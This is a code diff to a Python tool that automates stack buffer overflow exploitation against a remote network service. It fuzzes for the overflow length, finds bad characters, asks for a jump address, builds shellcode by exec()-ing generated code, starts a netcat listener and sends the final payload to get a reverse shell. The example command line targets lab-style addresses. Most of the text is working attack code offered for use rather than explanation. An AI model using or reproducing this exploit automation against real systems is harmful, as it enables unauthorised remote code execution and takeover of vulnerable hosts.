@@ -10,16 +10,30 @@ import argparse
 import random
 import os
 import sys
+import binascii
+
+
+# TODO: FIX `addr` otherwise it won't work!!!
+# TODO: add also offline version!
+# TODO: when trying to connect, let it `../`, `..|`, `..\`, `..-` and so on :)
+# TODO: clean the main function, create other funtions and call them inside `main()`!
+# TODO: would be nice to allow the use of multiple threads (multi-threaded)!
+# TODO: save data to not restart all scans
+# TODO: (when fuzzing) resend request if time out, after 3 times do a `host_up()` check, if host is up try again and fail if still problems exist otherwise continue
+# TODO: nice, unique banner :)
+# TODO: -o flag (for output > file -> logger/logging_file)
+# TODO: user can create screen shot, read screen shot, get all chars and compare them to get bad chars!
 
 
 shell_code = ""
 payload = ""
+xbuf = ""
 
 
 def start_fuzzing(s: socket, prefix, r_ip_port, timeout=1, buffer_count=0, verbose=False):
     logging_console(f"Fuzzing prefix {prefix}...", "VERBOSE")
     length_of_overflow = fuzz(
-        prefix=prefix, ip=r_ip_port[0], port=r_ip_port[1], timeout=timeout, buffer_count=buffer_count)
+        prefix=prefix, ip=r_ip_port[0], port=r_ip_port[1], timeout=timeout, buffer_count=buffer_count, verbose=verbose)
 
     if length_of_overflow == -1:
         return (length_of_overflow, 0)
@@ -79,7 +93,7 @@ def start_bad_char_detection(prefix, length_of_overflow, r_ip_port, timeout=1):
         else:
             payload = prefix+" "+"A" * \
                 (length_of_overflow-len(all_characters)) + \
-                "\\x".join(all_characters)
+                "\\x"+"\\x".join(all_characters)
         print(f"len_of_overflow: {length_of_overflow}")
         print("Sending: ", payload)
         connected = False
@@ -157,6 +171,8 @@ def exploit_buffer_setup(shell_code, addr, prefix, offset):
 
 
 def start_exploitation(shell_code, addr, prefix, offset, random_port, r_ip_port, timeout):
+    # print("Final addr: ", bytes(f'\\x{str(addr)[5:7]}', encoding="latin1")+str(addr).split('\\\\')[1][4:-1].encode('latin1'))
+
     payload_thread = threading.Thread(
         target=exploit_buffer_setup, args=([shell_code, addr, prefix, offset]))
     payload_thread.start()
@@ -174,15 +190,24 @@ def start_exploitation(shell_code, addr, prefix, offset, random_port, r_ip_port,
         time.sleep(0.2)
     if os.path.isfile('payload.txt'):
         with open('payload.txt', 'w+') as file:
-            file.write(payload)
+            file.write(str(payload))
     else:
         with open('payload.txt', 'a+') as file:
-            file.write(payload)
+            file.write(str(payload))
     logging_console("Generated payload, saved in `payload.txt`", "POSITIVE")
     logging_console("Starting netcat", "VERBOSE")
     netcat(random_port)
     logging_console("Sending payload", "VERBOSE")
-    send(payload, r_ip_port[0], r_ip_port[1], timeout)
+
+    # sending without using `send()` function, because the shell code will be wrong after decoding and encoding it!
+    s = connect((r_ip_port[0], r_ip_port[1]), timeout=timeout)
+    try:
+        s.send(payload)
+        recv(1024, s)
+        return True
+    except Exception:
+        return False
+
     logging_console("Payload sent", "INFO")
     # check netcat!
 
@@ -205,9 +230,10 @@ def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix=
 \x1b[91m| |_ | | | |/ __| |/ / | '_ \ / _` | \x1b[32m  / _` |/ _` | '__/ _ \/ __/ __| \ \ / / _ \ \x1b[91m |  _ \| | | | |_   \x1b[39m  / __|/ __/ _` | '_ \| '_ \ / _ \ '__|
 \x1b[91m|  _|| |_| | (__|   <| | | | | (_| | \x1b[32m | (_| | (_| | | |  __/\__ \__ \ |\ V /  __/\x1b[91m  | |_) | |_| |  _|  \x1b[39m  \__ \ (_| (_| | | | | | | |  __/ |   
 \x1b[91m|_|   \__,_|\___|_|\_\_|_| |_|\__, |  \x1b[32m \__,_|\__, |_|  \___||___/___/_| \_/ \___|\x1b[91m  |____/ \___/|_|    \x1b[39m  |___/\___\__,_|_| |_|_| |_|\___|_|   
-\x1b[91m                              |___/   \x1b[32m       |___/   Made with \x1b[36m<3                                                                                      """
+\x1b[91m                              |___/   \x1b[32m       |___/   Made with \x1b[31m<3                                                                                      """
     if not nobanner:
         print(banner)
+
     if verbose:
         init(True)
 
@@ -216,7 +242,8 @@ def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix=
     try:
         s = connect(r_ip_port)
         logging_console("Connected!"+" "*10, "POSITIVE")
-    except:
+    except Exception as e:
+        print("\n\n"+e.args[0], e)
         logging_console(
             "Connection timeout, could not connect. Executing ping test...", "WARNING")
         if not host_up(r_ip_port[0]):
@@ -237,7 +264,8 @@ def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix=
             offset = 0
             for prefix in range(prefixes):
                 len_of_overflow_small, offset_small = start_fuzzing(
-                    s, prefix, r_ip_port, timeout, buffer_count, verbose)
+                    s, prefix, r_ip_port, timeout, buffer_count, verbose
+                )
 
     else:
         logging_console("Escaped fuzz, will use given values", "POSITIVE")
@@ -263,10 +291,14 @@ def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix=
     addr = ""
     while len(addr) == 0:
         addr = logging_console(
-            "Type in address where i.e. `PUSH ESP` is found: (format: \\xADDRESS)", "QUESTION")
+            "Type in address where i.e. `PUSH ESP` is found: (format: ADDRESS without 0x)", "QUESTION")
 
     if convention == "little":
+        print("Addr before le: ", addr)
         addr = little_endian(addr)
+        print("Addr after le: ", addr)
+    else:
+        print("Convention is not le, it's: ", convention)
     random_port = random.randint(1100, 65000)
     bad_chars = ''.join(bad_chars)
     shell_code_thread = threading.Thread(
@@ -291,22 +323,23 @@ def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix=
 
     # exploitation
     bad_chars = ''.join(bad_chars)
-    print("bad_chars: ", bad_chars)
-    print("shell_code before exec(): ", shell_code)
+    #print("bad_chars: ", bad_chars)
+    #print("shell_code before exec(): ", shell_code)
     exec(shell_code)
-    exec(f"shell_code = buf")
-    print("shell_code after exec(): ", shell_code)
-    print("addr: ", addr)
-    print("prefix: ", prefix)
-    print("offset: ", offset)
-    print("offset_user: ", offset_user)
-    xbuf = ""
-    exec("xbuf = buf")
-    # exec(
-    #     f"start_exploitation(buf.decode('latin1'), {addr}, {prefix}, {offset}, {random_port}, {r_ip_port}, {timeout})")
-    print("xbuf: ", xbuf)
-    start_exploitation(xbuf, addr, prefix, offset,
-                       random_port, r_ip_port, timeout)
+    #exec(f"shell_code = buf")
+    #print("shell_code after exec(): ", shell_code)
+    #print("addr: ", addr)
+    #print("prefix: ", prefix)
+    #print("offset: ", offset)
+    #print("offset_user: ", offset_user)
+    exec("global xbuf; xbuf=buf")
+
+    # Change the address to the needed format
+    addr = binascii.unhexlify(addr)
+    print("Addr: > > ", addr)
+
+    start_exploitation(xbuf, addr, prefix.replace('\\\\', '\\').encode(
+        'latin1'), offset, random_port, r_ip_port, timeout)
 
 
 if __name__ == '__main__':
@@ -352,6 +385,12 @@ python3 {sys.argv[0]} --lhost 10.10.10.10 --lport 1337 --rhost 10.10.10.11 --rpo
             "There should be one convention (--littleEndian or --bigEndian), type in -h or --help for help")
         logging_console("Exiting program...", "WARNING")
 
+    if args.littleEndian and not args.bigEndian:
+        args.littleEndian = "little"
+
+    else:
+        args.littleEndian = "big"
+
     escapeFuzz, escapeBadChar = False, False
 
     if not args.prefix and args.prefixes:
@@ -388,7 +427,6 @@ python3 {sys.argv[0]} --lhost 10.10.10.10 --lport 1337 --rhost 10.10.10.11 --rpo
         escape_chars = ""
 
     nobanner = False
-
     if args.nobanner:
         nobanner = True
 
@@ -399,6 +437,7 @@ python3 {sys.argv[0]} --lhost 10.10.10.10 --lport 1337 --rhost 10.10.10.11 --rpo
         else:
             main((args.lhost, args.lport), (args.rhost, args.rport),
                  args.littleEndian, prefix=prefix, prefixes=prefixes, verbose=args.verbose, len_of_overflow=len_of_overflow, offset_user=offset_user, escape_fuzz=escapeFuzz, escape_chars=escape_chars, escape_bad_char_detection=escapeBadChar, nobanner=nobanner)
+
     else:
         if args.timeout:
             main((args.lhost, args.lport), (args.rhost, args.rport),
